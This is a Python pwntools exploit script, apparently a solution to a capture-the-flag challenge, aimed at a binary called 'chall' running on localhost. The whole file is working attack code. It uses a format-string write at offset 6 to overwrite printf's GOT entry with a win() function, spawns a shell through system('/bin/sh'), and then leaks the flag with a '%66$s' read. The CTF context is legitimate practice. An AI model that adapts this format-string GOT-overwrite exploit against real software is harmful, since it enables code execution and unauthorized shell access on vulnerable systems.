#!/usr/bin/env python3
from pwn import *

exe = ELF("./chall", checksec=False)
context.binary = exe
context.log_level = "info"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        return r
    return remote("localhost", 3012)

def main():
    r = conn()

    r.recvline(timeout=1)  
    r.recvline(timeout=1)   
    r.recvline(timeout=1)   


    printf_got = exe.got["printf"]
    win_addr   = exe.sym["win"]
    log.info(f"printf@GOT = {hex(printf_got)}")
    log.info(f"win()      = {hex(win_addr)}")

    # Step 2: overwrite printf@GOT -> win()
    # offset = 6 (buf adalah argumen ke-6 di x86-64)
    offset  = 6
    payload = fmtstr_payload(offset, {printf_got: win_addr}, write_size="short")
    log.info(f"payload ({len(payload)} bytes)")
    r.sendline(payload)
    sleep(0.5)
    r.recvline(timeout=1)

    # Step 3: trigger win() → system("/bin/sh")
    r.sendline(b"trigger")
    log.success("Shell spawned!")
    sleep(0.5)

    # Step 4: jalankan ./flag lalu kirim %66$s
    r.sendline(b"./flag")
    sleep(0.5)
    r.recvuntil(b"Now where we?", timeout=2)
    r.sendline(b"%66$s")
    sleep(0.5)
    output = r.recvline(timeout=2)
    log.success(f"FLAG: {output.strip().decode(errors='replace')}")

    r.interactive()

if __name__ == "__main__":
    main()